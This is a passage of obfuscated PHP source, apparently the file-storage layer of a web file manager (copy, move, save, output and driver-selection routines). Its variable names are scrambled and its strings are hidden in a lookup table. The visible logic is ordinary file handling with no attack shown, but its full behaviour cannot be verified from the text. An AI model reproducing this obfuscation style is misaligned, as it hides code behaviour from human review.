str_replace(array($‹˜ï–ñÇ[120], $‹˜ï–ñÇ[1013]), $‹˜ï–ñÇ[439], substr($¤Ãæ‘‘, stripos($¤Ãæ‘‘, $‹˜ï–ñÇ[315]))); if ($°£¿€× == $‹˜ï–ñÇ[1168]) { $çÄöï×› = $‹˜ï–ñÇ[1192] . $ª‘€×Ù§ . $‹˜ï–ñÇ[1193]; } else { $çÄöï×› = (stripos($°£¿€×, $‹˜ï–ñÇ[11]) ? $‹˜ï–ñÇ[1194] : $‹˜ï–ñÇ[12]) . ($‹˜ï–ñÇ[1195] . $°£¿€× . $‹˜ï–ñÇ[1196] . $æ©«÷ö•); } $°šèÅ®ï[] = $çÄöï×›; } $Íõ‡š“ë = array($‹˜ï–ñÇ[1197] . $Ë€à½›¯ . $‹˜ï–ñÇ[1198], $‹˜ï–ñÇ[1199] . $Ë€à½›¯ . $‹˜ï–ñÇ[1200], implode($‹˜ï–ñÇ[50] . PHP_EOL, $°šèÅ®ï), $‹˜ï–ñÇ[1201]); $°›˜ÈĞÀ = implode(PHP_EOL, $Íõ‡š“ë); if ($Æ‹Îşùš && $Æ‹Îşùš == $‹˜ï–ñÇ[859]) { return $°›˜ÈĞÀ; } $ì®®ì¨ = array($‹˜ï–ñÇ[859] => $°›˜ÈĞÀ, $‹˜ï–ñÇ[13] => $†»ÚŸ©û); return $Æ‹Îşùš ? $ì®®ì¨[$Æ‹Îşùš] : $ì®®ì¨; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¤óÂßâÊ, $§îšÇ“¡) { $ÍË¹Ä § =& $_SERVER[ú‡®¯¨±]; $¹ä“«Ã  = $§îšÇ“¡; $GLOBALS[$ÍË¹Ä §[1202]] = $ÍË¹Ä §[1203] . $¤óÂßâÊ; Hook::trigger($ÍË¹Ä §[1203] . $¤óÂßâÊ . $ÍË¹Ä §[1204], $¹ä“«Ã ); $ä‰ªø° = self::driverMake($§îšÇ“¡[0]); if (!$ä‰ªø°) { return !1; } if (method_exists($ä‰ªø°, $¤óÂßâÊ)) { $ØÄê±… = @call_user_func_array(array($ä‰ªø°, $¤óÂßâÊ), $§îšÇ“¡); } else { if (method_exists($ä‰ªø°, $ÍË¹Ä §[1205])) { $ØÄê±… = @call_user_func_array(array($ä‰ªø°, $¤óÂßâÊ), $§îšÇ“¡); } else { if (method_exists(self, $¤óÂßâÊ)) { $ØÄê±… = @call_user_func_array(array(self, $¤óÂßâÊ), $§îšÇ“¡); } else { $ØÄê±… = call_user_func_array(array(parent, $¤óÂßâÊ), $§îšÇ“¡); } } } Hook::trigger($ÍË¹Ä §[1203] . $¤óÂßâÊ . $ÍË¹Ä §[1206], $¹ä“«Ã , $ØÄê±…); return $ØÄê±…; } public static function init($ÎÕËúåó) { return self::driverMake($ÎÕËúåó); } public static function copy($ÔØêÔİ´, $¤èšËÅ¹, $ıïäÁ¾Â = false, $Ş–¡ ’Ï = false) { return self::copyMoveStart($ÔØêÔİ´, $¤èšËÅ¹, $ıïäÁ¾Â, $_SERVER[ú‡®¯¨±][596], $Ş–¡ ’Ï); } public static function move($ü·ïÎ¤¦, $ˆ×ÌÆëÒ, $Ïøû¶¨ = false, $ÄíŸ›å = false) { return self::copyMoveStart($ü·ïÎ¤¦, $ˆ×ÌÆëÒ, $Ïøû¶¨, $_SERVER[ú‡®¯¨±][598], $ÄíŸ›å); } private static function copyMoveStart($Õº€½Ù, $Û‡îé¦ö, $½õãÂ”æ, $õÊ¾ÅÄˆ, $óÇÊÍÍ§) { $ƒ²æ€ÓÃ =& $_SERVER[ú‡®¯¨±]; $±óÁÛÛ¦ = array($Õº€½Ù, $Û‡îé¦ö, $½õãÂ”æ, $óÇÊÍÍ§); Hook::trigger($ƒ²æ€ÓÃ[1203] . $õÊ¾ÅÄˆ . $ƒ²æ€ÓÃ[1204], $±óÁÛÛ¦); $à½§œ†ë = self::copyMove($Õº€½Ù, $Û‡îé¦ö, $½õãÂ”æ, $õÊ¾ÅÄˆ, $óÇÊÍÍ§); Hook::trigger($ƒ²æ€ÓÃ[1203] . $õÊ¾ÅÄˆ . $ƒ²æ€ÓÃ[1206], $±óÁÛÛ¦, $à½§œ†ë); return $à½§œ†ë; } public static function saveFile($ñ«¯ª…Ï, $‰÷ƒ®«ú, $ÏïÜçáÜ = true) { $á¢ÛËÈ¦ =& $_SERVER[ú‡®¯¨±]; $©ïşáÒı = self::info($‰÷ƒ®«ú); $Ğˆ–¹«ó = self::driverMake($ñ«¯ª…Ï); $°¥²ÎŞß = self::driverMake($‰÷ƒ®«ú); $ı‚ÏÔ¢Å = !1; if ($°¥²ÎŞß->pathParse[$á¢ÛËÈ¦[1207]]) { $ı‚ÏÔ¢Å = $°¥²ÎŞß; $®áôóš = $°¥²ÎŞß->pathParse[$á¢ÛËÈ¦[1207]]; $°¥²ÎŞß = self::driverMake($®áôóš); } if ($Ğˆ–¹«ó->pathParse[$á¢ÛËÈ¦[1207]]) { $ş˜àşîı = $Ğˆ–¹«ó->pathParse[$á¢ÛËÈ¦[1207]]; $Ğˆ–¹«ó = self::driverMake($ş˜àşîı); } $åÈ§ƒø = $°¥²ÎŞß->pathFather($‰÷ƒ®«ú); $Í¬£È’ = !0; if (!$ÏïÜçáÜ && self::driverIsSame($Ğˆ–¹«ó, $°¥²ÎŞß)) { $Í¬£È’ = !1; } $ûŞÂ÷ò˜ = self::copyFile($Ğˆ–¹«ó, $ñ«¯ª…Ï, $°¥²ÎŞß, $åÈ§ƒø, $©ïşáÒı[$á¢ÛËÈ¦[32]], $Í¬£È’); if ($ı‚ÏÔ¢Å) { $ûŞÂ÷ò˜ = $ı‚ÏÔ¢Å->getPathOuter($ûŞÂ÷ò˜); } return $ûŞÂ÷ò˜; } private static function copyMove($êŒ´¼Ö“, $˜¯†‚â, $Å‹šßó, $½×åÀï, $¸Ãıõú = false) { $ßÏÔØ¤Ê =& $_SERVER[ú‡®¯¨±]; if (!$êŒ´¼Ö“ || $êŒ´¼Ö“ == $ßÏÔØ¤Ê[8] || !$˜¯†‚â) { return !1; } ignore_timeout(); $ï§Ãù¬ = self::driverMake($êŒ´¼Ö“); $¼Ö¸¤Î¢ = self::driverMake($˜¯†‚â); $ôŞ¾ìÌĞ = $½×åÀï == $ßÏÔØ¤Ê[598]; $¹Ñ—•Ã± = !1; if ($¼Ö¸¤Î¢->pathParse[$ßÏÔØ¤Ê[1207]]) { $¹Ñ—•Ã± = $¼Ö¸¤Î¢; $˜¯†‚â = $¼Ö¸¤Î¢->pathParse[$ßÏÔØ¤Ê[1207]]; $¼Ö¸¤Î¢ = self::driverMake($˜¯†‚â); } if ($ï§Ãù¬->pathParse[$ßÏÔØ¤Ê[1207]]) { $êŒ´¼Ö“ = $ï§Ãù¬->pathParse[$ßÏÔØ¤Ê[1207]]; $ï§Ãù¬ = self::driverMake($êŒ´¼Ö“); } self::check($ï§Ãù¬, $êŒ´¼Ö“, $¼Ö¸¤Î¢, $˜¯†‚â); Hook::trigger($ßÏÔØ¤Ê[1208], $ï§Ãù¬, $êŒ´¼Ö“, $¼Ö¸¤Î¢, $˜¯†‚â); $çË‚Êç‰ = self::driverIsSame($ï§Ãù¬, $¼Ö¸¤Î¢); if ($çË‚Êç‰) { if ($½×åÀï == $ßÏÔØ¤Ê[598] && !method_exists($¼Ö¸¤Î¢, $ßÏÔØ¤Ê[1209]) && trim($˜¯†‚â, $ßÏÔØ¤Ê[8]) == trim($¼Ö¸¤Î¢->pathFather($êŒ´¼Ö“), $ßÏÔØ¤Ê[8])) { if ($ï§Ãù¬->pathThis($êŒ´¼Ö“) != $¸Ãıõú && !$ï§Ãù¬->isTypeObject()) { return $ï§Ãù¬->rename($êŒ´¼Ö“, $¸Ãıõú); } return $¼Ö¸¤Î¢->getPathOuter($êŒ´¼Ö“); } if (method_exists($¼Ö¸¤Î¢, $½×åÀï)) { return $¼Ö¸¤Î¢->{$½×åÀï}($êŒ´¼Ö“, $˜¯†‚â, $Å‹šßó, $¸Ãıõú); } } if ($çË‚Êç‰ && $½×åÀï == $ßÏÔØ¤Ê[598] && $¼Ö¸¤Î¢->getType() == $ßÏÔØ¤Ê[108]) { $ë°áŒ®€ = $¼Ö¸¤Î¢->movePath($êŒ´¼Ö“, $˜¯†‚â, $¸Ãıõú); if ($ë°áŒ®€) { return $ë°áŒ®€; } } $Œ„†œÓÆ = $ï§Ãù¬->isFile($êŒ´¼Ö“); if (!$Œ„†œÓÆ && $¼Ö¸¤Î¢->getType() == $ßÏÔØ¤Ê[812] && $ï§Ãù¬->getType() == $ßÏÔØ¤Ê[108]) { $ë°áŒ®€ = $¼Ö¸¤Î¢->copyFolderFromIO($ï§Ãù¬, $êŒ´¼Ö“, $˜¯†‚â, $Å‹šßó, $ôŞ¾ìÌĞ, $¸Ãıõú); } else { $ë°áŒ®€ = self::copyPath($ï§Ãù¬, $êŒ´¼Ö“, $¼Ö¸¤Î¢, $˜¯†‚â, $Å‹šßó, $ôŞ¾ìÌĞ, $Œ„†œÓÆ, $¸Ãıõú); } if ($ë°áŒ®€ && $ôŞ¾ìÌĞ) { $ï§Ãù¬->remove($êŒ´¼Ö“); } if ($¹Ñ—•Ã±) { $ë°áŒ®€ = $¹Ñ—•Ã±->getPathOuter($ë°áŒ®€); } return $ë°áŒ®€; } private static function check($ìğÃ³‡Ì, $¯®£ş›É, $À˜œËÊ×, &$â¢œ½¹“) { $ÅÔ¹€Ôë =& $_SERVER[ú‡®¯¨±]; if (self::driverIsSame($ìğÃ³‡Ì, $À˜œËÊ×) && $ìğÃ³‡Ì->isFolder($¯®£ş›É) && $ìğÃ³‡Ì->isParentOf($¯®£ş›É, $â¢œ½¹“)) { show_json(LNG($ÅÔ¹€Ôë[1210]), !1); } if (!$ìğÃ³‡Ì->exist($¯®£ş›É)) { show_json(LNG($ÅÔ¹€Ôë[107]), !1); } } private static function copyPath($¯•ÃÙ–, $°ÎçúƒÑ, $›àŸóá¿, $à‰›¥‚•, $óÅî¹, $§ìŞ°ï‘, $šõ£Ü­, $ÎŸ³ú¿¬ = false, $‹µÜÑŠ = true) { $š‹Å¦ÅÍ =& $_SERVER[ú‡®¯¨±]; $í¦‡£©§ = empty($ÎŸ³ú¿¬) && $ÎŸ³ú¿¬ !== $š‹Å¦ÅÍ[224] ? $¯•ÃÙ–->pathThis($°ÎçúƒÑ) : $ÎŸ³ú¿¬; if ($óÅî¹) { $È”˜îğğ = $›àŸóá¿->fileNameExist($à‰›¥‚•, $í¦‡£©§); $«­şÒÈï = $í¦‡£©§; $í¦‡£©§ = $›àŸóá¿->fileNameAuto($à‰›¥‚•, $í¦‡£©§, $óÅî¹, !$šõ£Ü­); if (!$È”˜îğğ || $«­şÒÈï != $í¦‡£©§) { $óÅî¹ = !1; } if ($‹µÜÑŠ && !$óÅî¹) { $›àŸóá¿->_data[$š‹Å¦ÅÍ[1211]] = !0; } } if ($šõ£Ü­) { return self::copyFile($¯•ÃÙ–, $°ÎçúƒÑ, $›àŸóá¿, $à‰›¥‚•, $í¦‡£©§, $§ìŞ°ï‘); } if ($óÅî¹ == REPEAT_RENAME_FOLDER) { $óÅî¹ = !1; } $èÀàÉ÷ = rtrim($à‰›¥‚•, $š‹Å¦ÅÍ[8]) . $š‹Å¦ÅÍ[8] . $í¦‡£©§; $±ßåçÀØ = $›àŸóá¿->mkdir($›àŸóá¿->getPath($èÀàÉ÷), $óÅî¹); $à‰›¥‚• = $›àŸóá¿->getPathInner($±ßåçÀØ); $Ùøªúê = $¯•ÃÙ–->listPath($°ÎçúƒÑ, !0); $Ùøªúê = is_array($Ùøªúê) ? $Ùøªúê : array($š‹Å¦ÅÍ[85] => array(), $š‹Å¦ÅÍ[84] => array()); $†©»Î = array_merge($Ùøªúê[$š‹Å¦ÅÍ[85]], $Ùøªúê[$š‹Å¦ÅÍ[84]]); foreach ($†©»Î as $Ïõ‚Ç¯Ï) { $‰ğûÉŠã = $Ïõ‚Ç¯Ï[$š‹Å¦ÅÍ[33]] == $š‹Å¦ÅÍ[226]; $°ÎçúƒÑ = $¯•ÃÙ–->getPathInner($Ïõ‚Ç¯Ï[$š‹Å¦ÅÍ[86]]); $¼Úº¢Ë = self::copyPath($¯•ÃÙ–, $°ÎçúƒÑ, $›àŸóá¿, $à‰›¥‚•, $óÅî¹, $§ìŞ°ï‘, $‰ğûÉŠã, !1, !1); if (!$¼Úº¢Ë) { IO::errorTips($š‹Å¦ÅÍ[1212] . $°ÎçúƒÑ . $š‹Å¦ÅÍ[72] . $à‰›¥‚•); } } self::copyMoveKeepInfo($¯•ÃÙ–, $°ÎçúƒÑ, $±ßåçÀØ); return $±ßåçÀØ; } private static function copyFile($Éå«±Å—, $»îª×¨±, $…å¾½¢, $Ğ·­ÂÊÂ, $‡­´³Êä, $•Ö¹´Ô²) { $ÓÜ·ÜÈê =& $_SERVER[ú‡®¯¨±]; $Ğ·­ÂÊÂ = $…å¾½¢->getPath(rtrim($Ğ·­ÂÊÂ, $ÓÜ·ÜÈê[8]) . $ÓÜ·ÜÈê[8] . $‡­´³Êä); $Øƒ¬Ò®ñ = $ÓÜ·ÜÈê[1213] . time() . rand_string(5); Hook::trigger($ÓÜ·ÜÈê[1214], $Éå«±Å—, $»îª×¨±, $…å¾½¢, $Ğ·­ÂÊÂ, $‡­´³Êä, $Øƒ¬Ò®ñ); if (self::driverIsSame($Éå«±Å—, $…å¾½¢)) { if ($•Ö¹´Ô²) { $àÏıĞ¬ = $…å¾½¢->moveFile($»îª×¨±, $Ğ·­ÂÊÂ); } else { $àÏıĞ¬ = $…å¾½¢->copyFile($»îª×¨±, $Ğ·­ÂÊÂ); } Hook::trigger($ÓÜ·ÜÈê[1215], $Éå«±Å—, $»îª×¨±, $…å¾½¢, $Ğ·­ÂÊÂ, $‡­´³Êä, $àÏıĞ¬); self::copyMoveKeepInfo($Éå«±Å—, $»îª×¨±, $àÏıĞ¬); return $àÏıĞ¬; } $“‚êïş = TEMP_FILES; if ($GLOBALS[$ÓÜ·ÜÈê[6]][$ÓÜ·ÜÈê[91]][$ÓÜ·ÜÈê[851]]) { $“‚êïş = $GLOBALS[$ÓÜ·ÜÈê[6]][$ÓÜ·ÜÈê[91]][$ÓÜ·ÜÈê[851]]; } $Õé®¡Û” = $“‚êïş; mk_dir($Õé®¡Û”); $ÖÃš®ÃÀ = $Õé®¡Û” . $Øƒ¬Ò®ñ; $Ñ–’ƒ”ï = $ÖÃš®ÃÀ; $ÖÃš®ÃÀ = $Éå«±Å—->download($»îª×¨±, $ÖÃš®ÃÀ); $ÖÃš®ÃÀ = $Éå«±Å—->iconvApp($ÖÃš®ÃÀ); if (substr($ÖÃš®ÃÀ, strlen($“‚êïş)) == $“‚êïş) { $•Ö¹´Ô² = !0; } $àÏıĞ¬ = $…å¾½¢->upload($Ğ·­ÂÊÂ, $ÖÃš®ÃÀ, $•Ö¹´Ô²); self::remove($Ñ–’ƒ”ï); Hook::trigger($ÓÜ·ÜÈê[1215], $Éå«±Å—, $»îª×¨±, $…å¾½¢, $Ğ·­ÂÊÂ, $‡­´³Êä, $àÏıĞ¬); self::copyMoveKeepInfo($Éå«±Å—, $»îª×¨±, $àÏıĞ¬); return $àÏıĞ¬; } private static function copyMoveKeepInfo($ÀëìËÉ™, $œ—Û’ğ, $™‰™™óˆ) { if (!$™‰™™óˆ) { return; } $°Ÿ›ıû = $ÀëìËÉ™->info($œ—Û’ğ); if (!is_array($°Ÿ›ıû)) { return; } IO::setModifyTime($™‰™™óˆ, $°Ÿ›ıû[$_SERVER[ú‡®¯¨±][87]]); } public static function pathFather($õ³îİ–ñ) { $¯Ï¯’Çû = IO::init($õ³îİ–ñ); $–­¼³¸¢ = $¯Ï¯’Çû->pathFather($¯Ï¯’Çû->path); return $¯Ï¯’Çû->getPathOuter($–­¼³¸¢); } public static function fileOut($Ë¹¥†×ï, $°Õ½°áˆ = false, $Ö¾¢ÑËê = false, $°ÀĞ„Ù = '') { $Ğ„Š‘£ = self::driverMake($Ë¹¥†×ï); if ($Ğ„Š‘£->isFileOutServer()) { return $Ğ„Š‘£->fileOutServer($Ë¹¥†×ï, $°Õ½°áˆ, $Ö¾¢ÑËê, $°ÀĞ„Ù); } return $Ğ„Š‘£->fileOut($Ë¹¥†×ï, $°Õ½°áˆ, $Ö¾¢ÑËê, $°ÀĞ„Ù); } public static function fileOutImage($•èòâôó, $ñåÁ®Ÿ« = 250) { $ËÃ©…Öï = array(250, 600, 1200, 2000, 3000, 5000); for ($ÜÙ²ò¨ = 0; $ÜÙ²ò¨ < count($ËÃ©…Öï); $ÜÙ²ò¨++) { if ($ÜÙ²ò¨ == 0 && $ñåÁ®Ÿ« <= $ËÃ©…Öï[$ÜÙ²ò¨]) { $ñåÁ®Ÿ« = $ËÃ©…Öï[$ÜÙ²ò¨]; break; } else { if ($ñåÁ®Ÿ« > $ËÃ©…Öï[$ÜÙ²ò¨ - 1] && $ñåÁ®Ÿ« <= $ËÃ©…Öï[$ÜÙ²ò¨]) { $ñåÁ®Ÿ« = $ËÃ©…Öï[$ÜÙ²ò¨]; break; } else { if ($ÜÙ²ò¨ == count($ËÃ©…Öï) - 1 && $ñåÁ®Ÿ« > $ËÃ©…Öï[$ÜÙ²ò¨]) { $ñåÁ®Ÿ« = $ËÃ©…Öï[$ÜÙ²ò¨]; break; } } } } $¬ÍŸ¨ÅÉ = self::driverMake($•èòâôó); if ($¬ÍŸ¨ÅÉ->isFileOutServer()) { return $¬ÍŸ¨ÅÉ->fileOutImageServer($•èòâôó, $ñåÁ®Ÿ«); } return $¬ÍŸ¨ÅÉ->fileOutImage($•èòâôó, $ñåÁ®Ÿ«); } private static function driverIsSame($“ßøËÔ, $Ã´•¶ò§) { $ø‘‹´Êå =& $_SERVER[ú‡®¯¨±]; $ğŞÂ‹õÀ = $“ßøËÔ->getType(); $Ó£ùˆë = $Ã´•¶ò§->getType(); if ($ğŞÂ‹õÀ != $Ó£ùˆë) { return !1; } if ($ğŞÂ‹õÀ == $ø‘‹´Êå[812]) { return !0; } if ($ğŞÂ‹õÀ == $ø‘‹´Êå[108]) { return !0; } if ($“ßøËÔ->pathDriver == $Ã´•¶ò§->pathDriver) { return !0; } return !1; } public static function copyUpdate($·ÕùŸ‹, $ùÚóŠÑò) { $ñØÂÛŸÄ =& $_SERVER[ú‡®¯¨±]; if (!IO::exist($·ÕùŸ‹)) { return !1; } if (!IO::exist($ùÚóŠÑò)) { IO::mkdir($ùÚóŠÑò); } $âü·ä±ä = array_to_keyvalue(self::listAllSimple($·ÕùŸ‹), $ñØÂÛŸÄ[86]); $ÒÉ€œ«™ = array_to_keyvalue(self::listAllSimple($ùÚóŠÑò), $ñØÂÛŸÄ[86]); $¯°‰Ä = array(); $ïÜì‚œü = array(); foreach ($âü·ä±ä as $ò¡íÓÃ„ => $ñì©à½°) { if (isset($ÒÉ€œ«™[$ò¡íÓÃ„])) { if ($ñì©à½°[$ñØÂÛŸÄ[77]] == 1) { continue; } if ($ÒÉ€œ«™[$ò¡íÓÃ„][$ñØÂÛŸÄ[78]] == $ñì©à½°[$ñØÂÛŸÄ[78]]) { continue; } } if ($ñì©à½°[$ñØÂÛŸÄ[77]] == 1) { $ïÜì‚œü[] = $ùÚóŠÑò . $ñØÂÛŸÄ[8] . trim($ò¡íÓÃ„, $ñØÂÛŸÄ[8]); continue; } $ŞŒ€ü¨ = strstr(trim($ò¡íÓÃ„, $ñØÂÛŸÄ[8]), $ñØÂÛŸÄ[8]) ? get_path_father($ò¡íÓÃ„) : $ñØÂÛŸÄ[12]; $¯°‰Ä[] = array($ñØÂÛŸÄ[1216] => $ñì©à½°[$ñØÂÛŸÄ[88]], $ñØÂÛŸÄ[1217] => rtrim($ùÚóŠÑò, $ñØÂÛŸÄ[8]) . $ñØÂÛŸÄ[8] . $ŞŒ€ü¨, $ñØÂÛŸÄ[1218] => $ñì©à½°); } $˜¶èˆİ = array($ñØÂÛŸÄ[226] => $¯°‰Ä, $ñØÂÛŸÄ[77] => $ïÜì‚œü); Hook::trigger($ñØÂÛŸÄ[1219], $·ÕùŸ‹, $ùÚóŠÑò, $˜¶èˆİ); foreach ($ïÜì‚œü as $ñì©à½°) { IO::mkdir($ñì©à½°); } foreach ($¯°‰Ä as $ñì©à½°) { IO::copy($ñì©à½°[$ñØÂÛŸÄ[1216]], $ñì©à½°[$ñØÂÛŸÄ[1217]], REPEAT_REPLACE); } } public static function fileSubstr($ºûÕ£·ô, $Ú¶À‘õ³, $êŒáÓò– = false) { $ÏŸ·ü¶ =& $_SERVER[ú‡®¯¨±]; $ÉşöÎ²Ÿ = self::driverMake($ºûÕ£·ô); $‡Ñ¡Ø¼Æ = $ÉşöÎ²Ÿ->size($ºûÕ£·ô); $ÑŞ’¢ ¢ = $Ú¶À‘õ³; $ãìÎâÍã = $êŒáÓò–; if ($Ú¶À‘õ³ < 0) { $Ú¶À‘õ³ = $‡Ñ¡Ø¼Æ + $Ú¶À‘õ³; } if ($êŒáÓò– === !1) { $êŒáÓò– = $‡Ñ¡Ø¼Æ - $Ú¶À‘õ³; } if ($Ú¶À‘õ³ + $êŒáÓò– > $‡Ñ¡Ø¼Æ) { $êŒáÓò– = $‡Ñ¡Ø¼Æ - $Ú¶À‘õ³; } if (!$‡Ñ¡Ø¼Æ && $ÉşöÎ²Ÿ->getType() == $ÏŸ·ü¶[108] && !$ÉşöÎ²Ÿ->exist($ºûÕ£·ô)) { $–ĞĞĞÖ = get_path_this($ºûÕ£·ô); $²Ú Ş› = parse_url_query($–ĞĞĞÖ); if (is_array($²Ú Ş›) && isset($²Ú Ş›[$ÏŸ·ü¶[32]])) { $–ĞĞĞÖ = urldecode($²Ú Ş›[$ÏŸ·ü¶[32]]); } throw new Exception($ÏŸ·ü¶[1220] . LNG($ÏŸ·ü¶[1221]) . $ÏŸ·ü¶[1022] . clear_html($–ĞĞĞÖ) . $ÏŸ·ü¶[12]); } if ($êŒáÓò– <= 0) { return $ÏŸ·ü¶[12]; } if ($Ú¶À‘õ³ < 0 || $Ú¶À‘õ³ >= $‡Ñ¡Ø¼Æ || $êŒáÓò– > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\x52\x65\141\144\40\145\162\162\157\162\41\40\163\164\141\x72\x74\x3d{$Ú¶À‘õ³}\x3b\154\x65\x6e\147\164\150\75{$êŒáÓò–}\x3b\40\x73\151\172\x65\75{$‡Ñ¡Ø¼Æ}\x3b"); } $ÙÕâÆİ§ = $ÉşöÎ²Ÿ->fileSubstr($ºûÕ£·ô, $Ú¶À‘õ³, $êŒáÓò–); if (!$ÙÕâÆİ§ && $êŒáÓò– && isset($GLOBALS[$ÏŸ·ü¶[1222]])) { throw new Exception($GLOBALS[$ÏŸ·ü¶[1222]][$ÏŸ·ü¶[1223]]); } return $ÙÕâÆİ§; } private static function driverMake(&$€‡“ĞŒ) { $®ƒ‡¯¬ı =& $_SERVER[ú‡®¯¨±]; $ôÔ‹Îíœ = KodIO::parse($€‡“ĞŒ); if (!self::$driverListSystem) { $ŸÚÓ¸ò¸ = Model($®ƒ‡¯¬ı[822])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ŸÚÓ¸ò¸, $®ƒ‡¯¬ı[453]); } if ($ôÔ‹Îíœ[$®ƒ‡¯¬ı[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ôÔ‹Îíœ[$®ƒ‡¯¬ı[453]]]) { return !1; } $€‡“ĞŒ = $ôÔ‹Îíœ[$®ƒ‡¯¬ı[1224]]; $ş‡Ã‡—À = self::driverGet($ôÔ‹Îíœ, $€‡“ĞŒ); return $ş‡Ã‡—À; } private static function driverGet($€»áÌµÅ, &$ÔÉ›Û÷”) { $í¥™²¢« =& $_SERVER[ú‡®¯¨±]; $½¸Å¦ãÃ = $€»áÌµÅ[$í¥™²¢«[1225]]; $ì÷’¸©· = $€»áÌµÅ[$í¥™²¢«[453]]; switch ($€»áÌµÅ[$í¥™²¢«[33]]) { case KodIO::KOD_IO: $¦®”¼­Š = self::$driverListSystem[$ì÷’¸©·]; break; case KodIO::KOD_SOURCE: $ÔÉ›Û÷” = $ì÷’¸©· . $ÔÉ›Û÷”; $¦®”¼­Š = array($í¥™²¢«[1226] => $í¥™²¢«[1227], $í¥™²¢«[6] => $€»áÌµÅ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¡¶ÚÍ”· = $GLOBALS[$í¥™²¢«[1228]]; self::$driverListUser = array_to_keyvalue($¡¶ÚÍ”·, $í¥™²¢«[453]); } $¦®”¼­Š = self::$driverListUser[$ì÷’¸©·]; break; case KodIO::KOD_SHARE_LINK: $¦®”¼­Š = array($í¥™²¢«[1226] => $í¥™²¢«[1229], $í¥™²¢«[6] => $€»áÌµÅ); $Êìì¤– = Action($í¥™²¢«[1230])->sharePathInfo($€»áÌµÅ[$í¥™²¢«[86]]); $ÔÉ›Û÷” = $Êìì¤–[$í¥™²¢«[183]]; if (!$Êìì¤–[$í¥™²¢«[183]]) { $Á´§¹ë¢ = Model($í¥™²¢«[642])->getInfo($Êìì¤–[$í¥™²¢«[643]]); $ÔÉ›Û÷” = KodIO::clear($Á´§¹ë¢[$í¥™²¢«[1231]] . $€»áÌµÅ[$í¥™²¢«[1224]]); $€»áÌµÅ[$í¥™²¢«[539]] = $Á´§¹ë¢; $€»áÌµÅ[$í¥™²¢«[1207]] = $ÔÉ›Û÷”; $¦®”¼­Š = array($í¥™²¢«[1226] => $í¥™²¢«[1232], $í¥™²¢«[6] => $€»áÌµÅ); } break; case KodIO::KOD_SHARE_ITEM: $¦®”¼­Š = array($í¥™²¢«[1226] => $í¥™²¢«[1233], $í¥™²¢«[6] => $€»áÌµÅ); $Á´§¹ë¢ = Model($í¥™²¢«[642])->getInfo($€»áÌµÅ[$í¥™²¢«[453]]); if ($Á´§¹ë¢[$í¥™²¢«[183]] == $í¥™²¢«[224]) { $ÔÉ›Û÷” = KodIO::clear($Á´§¹ë¢[$í¥™²¢«[1231]] . $€»áÌµÅ[$í¥™²¢«[1224]]); $€»áÌµÅ[$í¥™²¢«[539]] = $Á´§¹ë¢; $€»áÌµÅ[$í¥™²¢«[1207]] = $ÔÉ›Û÷”; $¦®”¼­Š = array($í¥™²¢«[1226] => $í¥™²¢«[1234], $í¥™²¢«[6] => $€»áÌµÅ); } else { if (!$ÔÉ›Û÷”) { $ÔÉ›Û÷” = $Á´§¹ë¢[$í¥™²¢«[183]]; } } break; default: $ÔÉ›Û÷” = $€»áÌµÅ[$í¥™²¢«[86]]; $¦®”¼­Š = array($í¥™²¢«[1226] => $í¥™²¢«[1235]); break; } $ÆÌ¡Ö§’ = $€»áÌµÅ[$í¥™²¢«[86]]; if (!isset(self::$driverCache[$ÆÌ¡Ö§’])) { $¤‚óƒâä = strtolower($¦®”¼­Š[$í¥™²¢«[97]]); $ÀÓãèÈÍ = $GLOBALS[$í¥™²¢«[6]][$í¥™²¢«[91]][$í¥™²¢«[881]]; $À³§İ—ú = $í¥™²¢«[76] . (isset($ÀÓãèÈÍ[$¤‚óƒâä]) ? $ÀÓãèÈÍ[$¤‚óƒâä] : ucfirst($¤‚óƒâä)); if (!class_exists($À³§İ—ú)) { show_json("{$À³§İ—ú}\x20\156\x6f\x74\x20\145\170\151\163\x74\x73\41", !1); } $¦ÌÇŠ«ç = isset($¦®”¼­Š[$í¥™²¢«[6]]) ? $¦®”¼­Š[$í¥™²¢«[6]] : !1; self::$driverCache[$ÆÌ¡Ö§’] = new $À³§İ—ú($¦ÌÇŠ«ç); } $¢û£ªÈÀ = self::$driverCache[$ÆÌ¡Ö§’]; $¢û£ªÈÀ->pathDriver = $½¸Å¦ãÃ; $¢û£ªÈÀ->pathBase = $í¥™²¢«[12]; if (isset($¦®”¼­Š[$í¥™²¢«[6]][$í¥™²¢«[1236]])) { $¢û£ªÈÀ->pathBase = rtrim($¦®”¼­Š[$í¥™²¢«[6]][$í¥™²¢«[1236]], $í¥™²¢«[8]) . $í¥™²¢«[8]; $ÔÉ›Û÷” = $¢û£ªÈÀ->pathBase . ltrim($ÔÉ›Û÷”, $í¥™²¢«[8]); } $ÔÉ›Û÷” = $¢û£ªÈÀ->getPath($ÔÉ›Û÷”); if (isset($€»áÌµÅ[$í¥™²¢«[1207]])) { $ÔÉ›Û÷” = $€»áÌµÅ[$í¥™²¢«[1207]]; } $¢û£ªÈÀ->path = $ÔÉ›Û÷”; return $¢û£ªÈÀ; } public static function errorTips($ĞÜĞ¯íı = false) { $Û­¿ˆ•¼ =& $_SERVER[ú‡®¯¨±]; static $ÅÊ¬¡¥© = array(); $¿Íº°øÅ = 1000; if ($ĞÜĞ¯íı === -1) { return $ÅÊ¬¡¥© ? $ÅÊ¬¡¥©[count($ÅÊ¬¡¥©) - 1] : $Û­¿ˆ•¼[12]; } if ($ĞÜĞ¯íı === !1) { return implode($Û­¿ˆ•¼[207], $ÅÊ¬¡¥©); } if (count($ÅÊ¬¡¥©) >= $¿Íº°øÅ) { $ÅÊ¬¡¥© = array_slice($ÅÊ¬¡¥©, $¿Íº°øÅ * 0.5, $¿Íº°øÅ); } $ÅÊ¬¡¥©[] = $ĞÜĞ¯íı; write_log($Û­¿ˆ•¼[165] . ACTION . $Û­¿ˆ•¼[1237] . $ĞÜĞ¯íı, $Û­¿ˆ•¼[1238]); } public static function getLastError($å¡¹†ã = '') { $·¯äÔ¤ = self::errorTips(-1); return $·¯äÔ¤ ? $·¯äÔ¤ : $å¡¹†ã; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‘·ãè‚“; if ($‘·ãè‚“) { return $‘·ãè‚“; } $©Ñ¼îÃò = 